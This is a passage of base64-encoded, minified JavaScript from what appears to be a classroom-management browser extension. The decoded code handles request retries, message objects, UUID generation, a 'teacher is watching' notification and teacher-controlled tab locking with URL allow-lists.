nVuY3Rpb24oKXt0aGlzLmlzQWJvcnRlZHx8dGhpcy5zZW5kUmVxdWVzdChmdW5jdGlvbihzLG8pe2lmKCF0aGlzLmlzQWJvcnRlZCl7dmFyIGE9ZS5yZXRyeVN0cmF0ZWd5KHMsbyxlKSx1PWUuaXNTdWNjZXNzKHMsbywhMCksYz0obmV3IERhdGUpLmdldFRpbWUoKS8xZTM7aWYobisrLGUucmV0cnlDb3VudCYmbj5lLnJldHJ5Q291bnQpcmV0dXJuIHZvaWQgdGhpcy5fZGVsaXZlclJlc3BvbnNlKHMsbyk7aWYoZS5yZXRyeVRpbWVvdXQmJmMtdD5lLnJldHJ5VGltZW91dClyZXR1cm4gdm9pZCB0aGlzLl9kZWxpdmVyUmVzcG9uc2UocyxvKTtpZih1fHwhYSlyZXR1cm4gdm9pZCB0aGlzLl9kZWxpdmVyUmVzcG9uc2UocyxvKTtpZighZS5yZXRyeUNvdW50JiYhZS5yZXRyeVRpbWVvdXQpcmV0dXJuIHZvaWQgdGhpcy5fZGVsaXZlclJlc3BvbnNlKHMsbyk7cj1udWxsPT09cj9lLnJldHJ5SW5pdGlhbERlbGF5OmUucmV0cnlCYWNrb2ZmKHIpLHRoaXMucmV0cnlDYWxsYmFja3MuZm9yRWFjaChmdW5jdGlvbihlKXtlLmNhbGwobnVsbCxzLG8scil9KSx0aGlzLnJldHJ5VGltZXI9c2V0VGltZW91dChpLDFlMypyKX19LmJpbmQodGhpcykpfS5iaW5kKHRoaXMpO2koKX0sZS5fZGVsaXZlclJlc3BvbnNlPWZ1bmN0aW9uKGUsdCl7dGhpcy5kb25lPXtpc1N1Y2Nlc3M6dGhpcy5vcHQuaXNTdWNjZXNzKGUsdCksZXJyOmUscmVzcG9uc2U6dH0sdGhpcy5pc1N1Y2Nlc3M9dGhpcy5kb25lLmlzU3VjY2Vzcyx0aGlzLmlzU3VjY2Vzcz90aGlzLnN1Y2Nlc3NDYWxsYmFja3MuZm9yRWFjaChmdW5jdGlvbihlKXtlLmNhbGwobnVsbCx0KX0pOnRoaXMuZmFpbHVyZUNhbGxiYWNrcy5mb3JFYWNoKGZ1bmN0aW9uKG4pe24uY2FsbChudWxsLGUsdCl9KSx0aGlzLmRlc3Ryb3koKX0sZS5zZW5kUmVxdWVzdD1mdW5jdGlvbihlKXt2YXIgdD10aGlzLm9wdDtpZighd2luZG93Lm5hdmlnYXRvci5vbkxpbmUpcmV0dXJuIGUobmV3IEVycm9yKCJCcm93c2VyIGlzIG9mZmxpbmUiKSk7dmFyIG49b1t0Lm1ldGhvZF0odC51cmwpO24udGltZW91dCgxZTMqdC50aW1lb3V0KSxhLmVhY2godC5oZWFkZXJzLGZ1bmN0aW9uKGUsdCl7bi5zZXQodCxlKX0pLHQucXVlcnkmJm4ucXVlcnkodC5xdWVyeSksdC5kYXRhJiYoImZ1bmN0aW9uIj09dHlwZW9mIHQuZGF0YT9uLnNlbmQodC5kYXRhKCkpOm4uc2VuZCh0LmRhdGEpKSxuLmVuZChlKX0sZS5vblN1Y2Nlc3M9ZnVuY3Rpb24oZSl7cmV0dXJuIHRoaXMuZG9uZSYmdGhpcy5kb25lLmlzU3VjY2Vzcz9lKHRoaXMuZG9uZS5yZXNwb25zZSk6KHRoaXMuc3VjY2Vzc0NhbGxiYWNrcy5wdXNoKGUpLHRoaXMpfSxlLm9uRmFpbHVyZT1mdW5jdGlvbihlKXtyZXR1cm4gdGhpcy5kb25lJiYhdGhpcy5kb25lLmlzU3VjY2Vzcz9lKHRoaXMuZG9uZS5lcnIsdGhpcy5kb25lLnJlc3BvbnNlKToodGhpcy5mYWlsdXJlQ2FsbGJhY2tzLnB1c2goZSksdGhpcyl9LGUub25SZXRyeT1mdW5jdGlvbihlKXtyZXR1cm4gdGhpcy5yZXRyeUNhbGxiYWNrcy5wdXNoKGUpLHRoaXN9LGUuYWJvcnQ9ZnVuY3Rpb24oKXt0aGlzLmlzQWJvcnRlZD0hMCx0aGlzLmRlc3Ryb3koKX0sZS5kZXN0cm95PWZ1bmN0aW9uKCl7Y2xlYXJUaW1lb3V0KHRoaXMucmV0cnlUaW1lciksdGhpcy5zdWNjZXNzQ2FsbGJhY2tzPVtdLHRoaXMuZmFpbHVyZUNhbGxiYWNrcz1bXSx0aGlzLnJldHJ5Q2FsbGJhY2tzPVtdfX0oci5wcm90b3R5cGUpLGUuZXhwb3J0cz1pfSwsZnVuY3Rpb24oZSx0LG4peyhmdW5jdGlvbihlLHIpe2Z1bmN0aW9uIGkoZSx0KXt0aGlzLl9pZD1lLHRoaXMuX2NsZWFyRm49dH12YXIgcz1uKDIpLm5leHRUaWNrLG89RnVuY3Rpb24ucHJvdG90eXBlLmFwcGx5LGE9QXJyYXkucHJvdG90eXBlLnNsaWNlLHU9e30sYz0wO3Quc2V0VGltZW91dD1mdW5jdGlvbigpe3JldHVybiBuZXcgaShvLmNhbGwoc2V0VGltZW91dCx3aW5kb3csYXJndW1lbnRzKSxjbGVhclRpbWVvdXQpfSx0LnNldEludGVydmFsPWZ1bmN0aW9uKCl7cmV0dXJuIG5ldyBpKG8uY2FsbChzZXRJbnRlcnZhbCx3aW5kb3csYXJndW1lbnRzKSxjbGVhckludGVydmFsKX0sdC5jbGVhclRpbWVvdXQ9dC5jbGVhckludGVydmFsPWZ1bmN0aW9uKGUpe2UuY2xvc2UoKX0saS5wcm90b3R5cGUudW5yZWY9aS5wcm90b3R5cGUucmVmPWZ1bmN0aW9uKCl7fSxpLnByb3RvdHlwZS5jbG9zZT1mdW5jdGlvbigpe3RoaXMuX2NsZWFyRm4uY2FsbCh3aW5kb3csdGhpcy5faWQpfSx0LmVucm9sbD1mdW5jdGlvbihlLHQpe2NsZWFyVGltZW91dChlLl9pZGxlVGltZW91dElkKSxlLl9pZGxlVGltZW91dD10fSx0LnVuZW5yb2xsPWZ1bmN0aW9uKGUpe2NsZWFyVGltZW91dChlLl9pZGxlVGltZW91dElkKSxlLl9pZGxlVGltZW91dD0tMX0sdC5fdW5yZWZBY3RpdmU9dC5hY3RpdmU9ZnVuY3Rpb24oZSl7Y2xlYXJUaW1lb3V0KGUuX2lkbGVUaW1lb3V0SWQpO3ZhciB0PWUuX2lkbGVUaW1lb3V0O3Q+PTAmJihlLl9pZGxlVGltZW91dElkPXNldFRpbWVvdXQoZnVuY3Rpb24oKXtlLl9vblRpbWVvdXQmJmUuX29uVGltZW91dCgpfSx0KSl9LHQuc2V0SW1tZWRpYXRlPSJmdW5jdGlvbiI9PXR5cGVvZiBlP2U6ZnVuY3Rpb24oZSl7dmFyIG49YysrLHI9YXJndW1lbnRzLmxlbmd0aDwyPyExOmEuY2FsbChhcmd1bWVudHMsMSk7cmV0dXJuIHVbbl09ITAscyhmdW5jdGlvbigpe3Vbbl0mJihyP2UuYXBwbHkobnVsbCxyKTplLmNhbGwobnVsbCksdC5jbGVhckltbWVkaWF0ZShuKSl9KSxufSx0LmNsZWFySW1tZWRpYXRlPSJmdW5jdGlvbiI9PXR5cGVvZiByP3I6ZnVuY3Rpb24oZSl7ZGVsZXRlIHVbZV19fSkuY2FsbCh0LG4oMjEpLnNldEltbWVkaWF0ZSxuKDIxKS5jbGVhckltbWVkaWF0ZSl9LGZ1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gcigpe3JldHVybiBNYXRoLmZsb29yKChuZXcgRGF0ZSkuZ2V0VGltZSgpLzFlMyl9dmFyIGk9big1KSxzPW4oMjkpLG89ZnVuY3Rpb24oZSl7dGhpcy5tZXNzYWdlPWV9LGE9ZnVuY3Rpb24oKXt0aGlzLmluaXQuYXBwbHkodGhpcyxhcmd1bWVudHMpfTshZnVuY3Rpb24oZSl7ZnVuY3Rpb24gdCh0KXtPYmplY3QuZGVmaW5lUHJvcGVydHkoZSx0LHtnZXQ6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5fYXR0cnNbdF19LHNldDpmdW5jdGlvbihlKXt0aGlzLl9hdHRyc1t0XT1lfX0pfWZ1bmN0aW9uIG4odCl7T2JqZWN0LmRlZmluZVByb3BlcnR5KGUsdCx7Z2V0OmZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuX2F0dHJzW3RdfX0pfWUuaW5pdD1mdW5jdGlvbihlKXt0aGlzLl9hdHRycz17Y3JlYXRlZDpyKCksaW5zdGFuY2VfaWQ6aS5pbnN0YW5jZV9pZCxpZDpzLnY0KCksdmVyc2lvbjoxLHNlcXVlbmNlX2lkOihuZXcgRGF0ZSkuZ2V0VGltZSgpLGFjazohMSxzZW50Om51bGx9O2Zvcih2YXIgdCBpbiBlKWUuaGFzT3duUHJvcGVydHkodCkmJih0aGlzW3RdPWVbdF0pfSxbInNlbmRlciIsInJlY2lwaWVudCIsInR5cGUiLCJyZXBseV90byIsImNvcnJlbGF0aW9uX2lkIiwic2VxdWVuY2VfaWQiLCJhY2siLCJwYXlsb2FkIl0uZm9yRWFjaCh0KSxbImNyZWF0ZWQiLCJpbnN0YW5jZV9pZCIsImlkIiwidmVyc2lvbiIsInNlbnQiXS5mb3JFYWNoKG4pLGUudmFsaWRhdGU9ZnVuY3Rpb24oKXtpZighdGhpcy5zZW5kZXIpdGhyb3cgbmV3IG8oIllvdSBtdXN0IHNwZWNpZnkgYHNlbmRlcmAiKTtpZighdGhpcy5yZWNpcGllbnQpdGhyb3cgbmV3IG8oIllvdSBtdXN0IHNwZWNpZnkgYHJlY2lwaWVudGAiKTtpZighdGhpcy50eXBlKXRocm93IG5ldyBvKCJZb3UgbXVzdCBzcGVjaWZ5IGB0eXBlYCIpO2lmKHRoaXMuY29ycmVsYXRpb25faWQmJiJzdHJpbmciIT10eXBlb2YgdGhpcy5jb3JyZWxhdGlvbl9pZCl0aHJvdyBuZXcgbygiSWYgeW91IHNwZWNpZnkgYGNvcnJlbGF0aW9uX2lkYCBpdCBtdXN0IGJlIGEgc3RyaW5nIik7aWYoIXRoaXMuc2VxdWVuY2VfaWQgaW5zdGFuY2VvZiBOdW1iZXIpdGhyb3cgbmV3IG8oImBzZXF1ZW5jZV9pZGAgbXVzdCBiZSBhbiBudW1iZXIiKTtpZighdGhpcy5hY2sgaW5zdGFuY2VvZiBCb29sZWFuKXRocm93IG5ldyBvKCJgYWNrYCBtdXN0IGJlIGEgYm9vbGVhbiIpfSxlLnRvX29iaj1mdW5jdGlvbigpe3JldHVybiB0aGlzLnZhbGlkYXRlKCksSlNPTi5wYXJzZShKU09OLnN0cmluZ2lmeSh0aGlzLl9hdHRycykpfSxlLmdlbmVyYXRlX3JlcGx5PWZ1bmN0aW9uKGUsdCxuKXt2YXIgcj1uZXcgYShuKTtyZXR1cm4gci50eXBlPWUsci5jb3JyZWxhdGlvbl9pZD10aGlzLmNvcnJlbGF0aW9uX2lkLHIucmVwbHlfdG89dGhpcy5pZCxyLnNlbmRlcj10aGlzLnJlY2lwaWVudCxyLnJlY2lwaWVudD10aGlzLnNlbmRlcixyLnBheWxvYWQ9dCxyfX0oYS5wcm90b3R5cGUpLGEuZnJvbV9vYmo9ZnVuY3Rpb24oZSl7dmFyIHQ9bmV3IHRoaXM7cmV0dXJuIHQuX2F0dHJzPWUsdC52YWxpZGF0ZSgpLHR9LGUuZXhwb3J0cz1hfSwsLGZ1bmN0aW9uKGUsdCxuKXt2YXIgcj1uKDMpKCJ3YXRjaC1tb25pdG9yIiksaT1EYXRlLm5vdygpLHM9MTQ0ZTU7ZS5leHBvcnRzPXtpc193YXRjaGluZzpmdW5jdGlvbigpe3JldHVybiBpK3M+RGF0ZS5ub3coKX0sdGltZV9sZWZ0OmZ1bmN0aW9uKCl7cmV0dXJuKGkrcy1EYXRlLm5vdygpKS8xZTN9LHdhdGNoOmZ1bmN0aW9uKCl7aWYobG9jYWxTdG9yYWdlLmVuYWJsZWQpe2Nocm9tZS5ub3RpZmljYXRpb25zLmNyZWF0ZSgidGVhY2hlcldhdGNoaW5nIix7dHlwZToiYmFzaWMiLGljb25Vcmw6Imljb25zL2ljb24xMjgucG5nIix0aXRsZToiWW91ciBUZWFjaGVyIGlzIFdhdGNoaW5nIFlvdXIgU2NyZWVuLi4uIixtZXNzYWdlOiJZb3Ugc2hvdWxkIHByb2JyYWJseSBzd2l0Y2ggdG8gYSBwcm9kdWN0aXZlIHRhYiA6KSJ9LGZ1bmN0aW9uKCl7fSl9ci5pKCJ0ZWFjaGVyJ3Mgd2F0Y2hpbmciKSxpPURhdGUubm93KCl9LHNldF9kdXJhdGlvbjpmdW5jdGlvbihlKXtzPWV9fX0sLCwsZnVuY3Rpb24oZSx0LG4pe2Z1bmN0aW9uIHIoZSx0LG4pe3ZhciByPXQmJm58fDAsaT0wO2Zvcih0PXR8fFtdLGUudG9Mb3dlckNhc2UoKS5yZXBsYWNlKC9bMC05YS1mXXsyfS9nLGZ1bmN0aW9uKGUpezE2PmkmJih0W3IraSsrXT1jW2VdKX0pOzE2Pmk7KXRbcitpKytdPTA7cmV0dXJuIHR9ZnVuY3Rpb24gaShlLHQpe3ZhciBuPXR8fDAscj11O3JldHVybiByW2VbbisrXV0rcltlW24rK11dK3JbZVtuKytdXStyW2VbbisrXV0rIi0iK3JbZVtuKytdXStyW2VbbisrXV0rIi0iK3JbZVtuKytdXStyW2VbbisrXV0rIi0iK3JbZVtuKytdXStyW2VbbisrXV0rIi0iK3JbZVtuKytdXStyW2VbbisrXV0rcltlW24rK11dK3JbZVtuKytdXStyW2VbbisrXV0rcltlW24rK11dfWZ1bmN0aW9uIHMoZSx0LG4pe3ZhciByPXQmJm58fDAscz10fHxbXTtlPWV8fHt9O3ZhciBvPXZvaWQgMCE9PWUuY2xvY2tzZXE/ZS5jbG9ja3NlcTpmLGE9dm9pZCAwIT09ZS5tc2Vjcz9lLm1zZWNzOihuZXcgRGF0ZSkuZ2V0VGltZSgpLHU9dm9pZCAwIT09ZS5uc2Vjcz9lLm5zZWNzOl8rMSxjPWEtcCsodS1fKS8xZTQ7aWYoMD5jJiZ2b2lkIDA9PT1lLmNsb2Nrc2VxJiYobz1vKzEmMTYzODMpLCgwPmN8fGE+cCkmJnZvaWQgMD09PWUubnNlY3MmJih1PTApLHU+PTFlNCl0aHJvdyBuZXcgRXJyb3IoInV1aWQudjEoKTogQ2FuJ3QgY3JlYXRlIG1vcmUgdGhhbiAxME0gdXVpZHMvc2VjIik7cD1hLF89dSxmPW8sYSs9MTIyMTkyOTI4ZTU7dmFyIGw9KDFlNCooMjY4NDM1NDU1JmEpK3UpJTQyOTQ5NjcyOTY7c1tyKytdPWw+Pj4yNCYyNTUsc1tyKytdPWw+Pj4xNiYyNTUsc1tyKytdPWw+Pj44JjI1NSxzW3IrK109MjU1Jmw7dmFyIGQ9YS80Mjk0OTY3Mjk2KjFlNCYyNjg0MzU0NTU7c1tyKytdPWQ+Pj44JjI1NSxzW3IrK109MjU1JmQsc1tyKytdPWQ+Pj4yNCYxNXwxNixzW3IrK109ZD4+PjE2JjI1NSxzW3IrK109bz4+Pjh8MTI4LHNbcisrXT0yNTUmbztmb3IodmFyIG09ZS5ub2RlfHxoLHk9MDs2Pnk7eSsrKXNbcit5XT1tW3ldO3JldHVybiB0P3Q6aShzKX1mdW5jdGlvbiBvKGUsdCxuKXt2YXIgcj10JiZufHwwOyJzdHJpbmciPT10eXBlb2YgZSYmKHQ9ImJpbmFyeSI9PWU/bmV3IEFycmF5KDE2KTpudWxsLGU9bnVsbCksZT1lfHx7fTt2YXIgcz1lLnJhbmRvbXx8KGUucm5nfHxhKSgpO2lmKHNbNl09MTUmc1s2XXw2NCxzWzhdPTYzJnNbOF18MTI4LHQpZm9yKHZhciBvPTA7MTY+bztvKyspdFtyK29dPXNbb107cmV0dXJuIHR8fGkocyl9Zm9yKHZhciBhPW4oMTc1KSx1PVtdLGM9e30sbD0wOzI1Nj5sO2wrKyl1W2xdPShsKzI1NikudG9TdHJpbmcoMTYpLnN1YnN0cigxKSxjW3VbbF1dPWw7dmFyIGQ9YSgpLGg9WzF8ZFswXSxkWzFdLGRbMl0sZFszXSxkWzRdLGRbNV1dLGY9MTYzODMmKGRbNl08PDh8ZFs3XSkscD0wLF89MCxtPW87bS52MT1zLG0udjQ9byxtLnBhcnNlPXIsbS51bnBhcnNlPWksZS5leHBvcnRzPW19LCwsZnVuY3Rpb24oZSx0LG4pe2Z1bmN0aW9uIHIoZSx0LG4scil7cj11LmV4dGVuZCh7cmV0dXJuUmVhc29uOiExfSxyKTt2YXIgaT1uZXcgUmVnRXhwKGNocm9tZS5ydW50aW1lLmlkKyIvZGlhZ25vc3RpY3MuaHRtbCQiKTtpZihpLnRlc3QobikpcmV0dXJuIHIucmV0dXJuUmVhc29uPyJ1cmwiOiEwO3ZhciBzPW4ubWF0Y2goLyheaHR0cHM6XC9cL2RvY3NcLmdvb2dsZVwuY29tXC9cUypcLykodmlld2Zvcm18Zm9ybVJlc3BvbnNlKS8pO2lmKHMmJnNbMV0pZm9yKHZhciBhPTA7YTxlLmxlbmd0aDthKyspaWYoMD09PWVbYV0uaW5kZXhPZihzWzFdKSlyZXR1cm4gby5kKCJnb29nbGUgZm9ybSB1cmwgcGFzcyIsZVthXSxzKSxyLnJldHVyblJlYXNvbj8idXJsIjohMDt2YXIgYz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJhIik7Yy5ocmVmPW47Zm9yKHZhciBsPWMuaG9zdG5hbWU7bDspe2lmKC0xIT09dC5pbmRleE9mKGwpKXJldHVybiByLnJldHVyblJlYXNvbj8iZG9tYWluIjohMDtsPWwuc3BsaXQoIi4iKS5zbGljZSgxKS5qb2luKCIuIil9cmV0dXJuLTEhPT1lLmluZGV4T2Yobik/ci5yZXR1cm5SZWFzb24/InVybCI6ITA6Ii8iPT09bltuLmxlbmd0aC0xXSYmLTEhPT1lLmluZGV4T2Yobi5zbGljZSgwLG4ubGVuZ3RoLTEpKT9yLnJldHVyblJlYXNvbj8idXJsIjohMDoiIn1mdW5jdGlvbiBpKCl7dmFyIGU9ZC5nZXQoInN0YXRlIik7ImxvY2tpbmciPT09ZSYmKGU9ImluYWN0aXZlIiksInVubG9ja2luZyI9PT1lJiYoZT0iYWN0aXZlIik7dmFyIHQ9e3N0YXRlOmUsbm93OihuZXcgRGF0ZSkuZ2V0VGltZSgpLHVubG9ja190aW1lOmQuZ2V0KCJ1bmxvY2tUaW1lIiksbG9ja2VkX2J5OmQuZ2V0KCJtZXNzYWdlU2VuZGVyIiksbWVzc2FnZV9pZDpkLmdldCgibWVzc2FnZUlkIiksY29ycmVsYXRpb25faWQ6ZC5nZXQoIm1lc3NhZ2VDb3JyZWxhdGlvbklkIiksaW5zdGFuY2VfaWQ6Yy5pbnN0YW5jZV9pZCx1c2VyX2lkOmQuZ2V0KCJtZXNzYWdlUmVjaXBpZW50Iil9O3JldHVybiJpbmFjdGl2ZSI9PT10LnN0YXRlJiYoZGVsZXRlIHQubm93LGRlbGV0ZSB0LnVubG9ja190aW1lLGRlbGV0ZSB0LmxvY2tlZF9ieSxkZWxldGUgdC5tZXNzYWdlX2lkKSx0fXZhciBzPW4oMTUpLG89bigzKSgiaW50ZXJhY3QtdGFibG9ja2luZyIpLGE9big0KSx1PW4oOCksYz1uKDUpLGw9cy5Nb2RlbC5leHRlbmQoe2RlZmF1bHRzOmZ1bmN0aW9uKCl7cmV0dXJue3N0YXRlOiJpbmFjdGl2ZSIsdW5sb2NrVGltZTpudWxsLHVybHM6W10sZG9tYWluczpbXSx0aW1lb3V0OjAsY2xvc2VUYWJzOiExLG1lc3NhZ2U6IiIsbWVzc2FnZUR1cmF0aW9uOjEwLHVubG9ja01lc3NhZ2U6IiIsdW5sb2NrRHVyYXRpb246MTAsdW5sb2NrQmVoYXZpb3VyOiJub3RoaW5nIn19LGluaXRpYWxpemU6ZnVuY3Rpb24oKXtzd2l0Y2godGhpcy5vbigiY2hhbmdlOnN0YXRlIix0aGlzLm9uU3RhdGVDaGFuZ2UsdGhpcyksdGhpcy5nZXQoInN0YXRlIikpe2Nhc2UibG9ja2luZyI6dmFyIGU9KG5ldyBEYXRlKS5nZXRUaW1lKCktdGhpcy5nZXQoIm1lc3NhZ2VSZWNlaXZlZCIpO2UvMWUzPnRoaXMuZ2V0KCJ0aW1lb3V0IikrdGhpcy5nZXQoIm1lc3NhZ2VEdXJhdGlvbiIpPyhvLmkoIk5vdCByZXN0YXJ0aW5nIHRoaXMgbG9jaywgaXQncyB0b28gb2xkIiksc2V0VGltZW91dCh0aGlzLnNldC5iaW5kKHRoaXMsInN0YXRlIiwiaW5hY3RpdmUiKSwwKSk6dGhpcy5sb2NraW5nRW50ZXIoImxvY2tpbmciKTticmVhaztjYXNlImFjdGl2ZSI6dGhpcy5hY3RpdmVTdGFydFRpbWVyKCk7YnJlYWs7Y2FzZSJ1bmxvY2tpbmciOnNldFRpbWVvdXQodGhpcy5zZXQuYmluZCh0aGlzLCJzdGF0ZSIsImluYWN0aXZlIiksMCl9fSxvblN0YXRlQ2hhbmdlOmZ1bmN0aW9uKGUsdCl7dmFyIG49dGhpcy5wcmV2aW91cygic3RhdGUiKTtvLmQoInN0YXRlOiIsbiwiPT4iLHQpLCJmdW5jdGlvbiI9PXR5cGVvZiB0aGlzW24rIkV4aXQiXSYmdGhpc1tuKyJFeGl0Il0odCksImZ1bmN0aW9uIj09dHlwZW9mIHRoaXNbdCsiRW50ZXIiXSYmdGhpc1t0KyJFbnRlciJdKG4pfSxhcHBseUxvY2s6ZnVuY3Rpb24oZSl7by5kKCJBcHBseWluZyBsb2NrOiIsZS5wYXlsb2FkKTt2YXIgdD10aGlzLnRvSlNPTigpO3N3aXRjaCgidW5sb2NrQ2xvc2VUYWJzImluIGUucGF5bG9hZCYmKGUucGF5bG9hZC51bmxvY2tCZWhhdmlvdXI9ZS5wYXlsb2FkLnVubG9ja0Nsb3NlVGFicz8iY2xvc2VfdGFicyI6Im5vdGhpbmciLGRlbGV0ZSBlLnBheWxvYWQudW5sb2NrQ2xvc2VUYWJzKSx0aGlzLnNldCh1LmV4dGVuZCh7bWVzc2FnZUlkOmUuaWQsbWVzc2FnZUNvcnJlbGF0aW9uSWQ6ZS5jb3JyZWxhdGlvbl9pZCxtZXNzYWdlU2VuZGVyOmUuc2VuZGVyLG1lc3NhZ2VSZWNpcGllbnQ6ZS5yZWNpcGllbnQsbWVzc2FnZVJlY2VpdmVkOihuZXcgRGF0ZSkuZ2V0VGltZSgpfSxlLnBheWxvYWQpKSx0aGlzLmdldCgic3RhdGUiKSl7Y2FzZSJpbmFjdGl2ZSI6dGhpcy5zZXQoInN0YXRlIiwibG9ja2luZyIpO2JyZWFrO2Nhc2UibG9ja2luZyI6dGhpcy5sb2NraW5nRXhpdCgibG9ja2luZyIpLHRoaXMubG9ja2luZ0VudGVyKCJsb2NraW5nIik7YnJlYWs7Y2FzZSJhY3RpdmUiOnRoaXMuYWN0aXZlVXBkYXRlKHQpO2JyZWFrO2Nhc2UidW5sb2NraW5nIjp0aGlzLnNldCgic3RhdGUiLCJsb2NraW5nIil9fSxhcHBseVVubG9jazpmdW5jdGlvbihlKXt2YXIgdD1lLnBheWxvYWQ7c3dpdGNoKG8uZCgiQXBwbHlpbmcgdW5sb2NrOiIsdCksdGhpcy5zZXQoe21lc3NhZ2VJZDplLmlkLG1lc3NhZ2VDb3JyZWxhdGlvbklkOmUuY29ycmVsYXRpb25faWQsbWVzc2FnZVNlbmRlcjplLnNlbmRlcixtZXNzYWdlUmVjaXBpZW50OmUucmVjaXBpZW50LHVubG9ja01lc3NhZ2U6dC5tZXNzYWdlLHVubG9ja0R1cmF0aW9uOnQuZHVyYXRpb24sdW5sb2NrQ2xvc2VUYWJzOnQuY2xvc2VUYWJzfSksdC5iZWhhdmlvdXI/dGhpcy5zZXQoe3VubG9ja0JlaGF2aW91cjp0LmJlaGF2aW91cn0pOnQuY2xvc2VUYWJzJiZ0aGlzLnNldCh7dW5sb2NrQmVoYXZpb3VyOiJjbG9zZV90YWJzIn0pLHRoaXMuZ2V0KCJzdGF0ZSIpKXtjYXNlImluYWN0aXZlIjpicmVhaztjYXNlImxvY2tpbmciOnRoaXMuc2V0KCJzdGF0ZSIsImluYWN0aXZlIik7YnJlYWs7Y2FzZSJhY3RpdmUiOnRoaXMuc2V0KCJzdGF0ZSIsInVubG9ja2luZyIpO2JyZWFrO2Nhc2UidW5sb2NraW5nIjp0aGlzLnVubG9ja2luZ0V4aXQoInVubG9ja2luZyIpLHRoaXMudW5sb2NraW5nRW50ZXIoInVubG9ja2luZyIpfX0sbG9ja2luZ0VudGVyOmZ1bmN0aW9uKCl7dmFyIGU9dGhpcy5nZXQoIm1lc3NhZ2VEdXJhdGlvbiIpLHQ9ZnVuY3Rpb24oKXt2YXIgdD10aGlzLmdldCgibWVzc2FnZSIpO3JldHVybiB0PTE9PT1lP3QucmVwbGFjZSgiJChSRU1BSU5JTkcpIixjaHJvbWUuaTE4bi5nZXRNZXNzYWdlKCJsb2NraW5nTm90aWZpY2F0aW9uRHVyYXRpb24xIixbZV0pKTp0LnJlcGxhY2UoIiQoUkVNQUlOSU5HKSIsY2hyb21lLmkxOG4uZ2V0TWVzc2FnZSgibG9ja2luZ05vdGlmaWNhdGlvbkR1cmF0aW9uMlBsdXMiLFtlXSkpfS5iaW5kKHRoaXMpO2Nocm9tZS5ub3RpZmljYXRpb25zLmNsZWFyKCJ0YWJMb2NraW5nLWxvY2tpbmciLGZ1bmN0aW9uKCl7Y2hyb21lLm5vdGlmaWNhdGlvbnMuY3JlYXRlKCJ0YWJMb2NraW5nLWxvY2tpbmciLHt0eXBlOiJiYXNpYyIsdGl0bGU6Y2hyb21lLmkxOG4uZ2V0TWVzc2FnZSgibG9ja2luZ05vdGlmaWNhdGlvblRpdGxlIiksbWVzc2FnZTp0KCksaWNvblVybDoiaWNvbnMvaWNvbjEyOC5wbmciLHByaW9yaXR5OjIsaXNDbGlja2FibGU6ITEsYnV0dG9uczpbe3RpdGxlOmNocm9tZS5pMThuLmdldE1lc3NhZ2UoImxvY2tpbmdOb3RpZmljYXRpb25TdGFydE5vd0J1dHRvbiIpfV19LGZ1bmN0aW9uKCl7fSl9KSx0aGlzLl9sb2NraW5nVGltZXI9c2V0SW50ZXJ2YWwoZnVuY3Rpb24oKXtyZXR1cm4gZS0tLDA9PT1lP3ZvaWQgdGhpcy5zZXQoInN0YXRlIiwiYWN0aXZlIik6dm9pZCBjaHJvbWUubm90aWZpY2F0aW9ucy51cGRhdGUoInRhYkxvY2tpbmctbG9ja2luZyIse21lc3NhZ2U6dCgpfSxmdW5jdGlvbigpe30pfS5iaW5kKHRoaXMpLDFlMyl9LGxvY2tpbmdFeGl0OmZ1bmN0aW9uKCl7Y2hyb21lLm5vdGlmaWNhdGlvbnMuY2xlYXIoInRhYkxvY2tpbmctbG9ja2luZyIsZnVuY3Rpb24oKXt9KSxjbGVhclRpbWVvdXQodGhpcy5fbG9ja2luZ1RpbWVyKX0sYWN0aXZlU3RhcnRUaW1lcjpmdW5jdGlvbigpe3ZhciBlPW51bGw7dGhpcy5fYWN0aXZlVGltZXI9c2V0SW50ZXJ2YWwoZnVuY3Rpb24oKXtpZigobmV3IERhdGUpLmdldFRpbWUoKT50aGlzLmdldCgidW5sb2NrVGltZSIpKXJldHVybiB2b2lkIHRoaXMuc2V0KCJzdGF0ZSIsInVubG9ja2luZyIpO2lmKDA9PT1hLnVzZXJzLmFjdGl2ZVVzZXJzKCkubGVuZ3RoKXtpZihlfHwoby5pKCJ1c2VyIGJlY2FtZSBpbmFjdGl2ZSB3aGlsZSB0aGVpciB0YWJzIHdlcmUgbG9ja2VkIiksZT0obmV3IERhdGUpLmdldFRpbWUoKSksKG5ldyBEYXRlKS5nZXRUaW1lKCktZT4zZTUpcmV0dXJuIG8uaSgidXNlcnMgdGFicyB3ZXJlIHVubG9ja2VkIGR1ZSB0byB0aGVpciB1c2VyIGJlaW5nIGluYWN0aXZlIiksdm9pZCB0aGlzLnNldCgic3RhdGUiLCJ1bmxvY2tpbmciKX1lbHNlIGU9bnVsbH0uYmluZCh0aGlzKSw1ZTMpfSxhY3RpdmVFbnRlcjpmdW5jdGlvbigpe3ZhciBlPW4oMTYpO3RoaXMuc2V0KCJ1bmxvY2tUaW1lIiwobmV3IERhdGUpLmdldFRpbWUoKSsxZTMqdGhpcy5nZXQoInRpbWVvdXQiKSksdGhpcy5hY3RpdmVTdGFydFRpbWVyKCksdGhpcy5zZXQoInByZUxvY2tVUkxzIixuKDkpLnRhYnMucGx1Y2soInVybCIpKSx0aGlzLmdldCgiY2xvc2VUYWJzIik/ZS5zZXRUYWJzKDA9PT10aGlzLmdldCgidXJscyIpLmxlbmd0aD9bbnVsbF06dGhpcy5nZXQoInVybHMiKSk6dGhpcy5nZXQoInVybHMiKS5mb3JFYWNoKGUub3BlblRhYil9LGFjdGl2ZUV4aXQ6ZnVuY3Rpb24oKXtjbGVhclRpbWVvdXQodGhpcy5fYWN0aXZlVGltZXIpfSxhY3RpdmVVcGRhdGU6ZnVuY3Rpb24oZSl7dmFyIHQ9bigxNik7dGhpcy5nZXQoImNsb3NlVGFicyIpJiZjaHJvbWUudGFicy5xdWVyeSh7fSxmdW5jdGlvbihlKXtlLmZvckVhY2goZnVuY3Rpb24oZSl7dGhpcy5pc1VSTEFsbG93ZWQoZS51cmwpfHx0LmNsb3NlVGFiKGUuaWQpfS5iaW5kKHRoaXMpKX0uYmluZCh0aGlzKSksdGhpcy5nZXQoInVybHMiKS5maWx0ZXIoZnVuY3Rpb24odCl7cmV0dXJuLTE9PT1lLnVybHMuaW5kZXhPZih0KX0pLmZvckVhY2godC5vcGVuVGFiKSx0aGlzLnNldCgidW5sb2NrVGltZSIsKG5ldyBEYXRlKS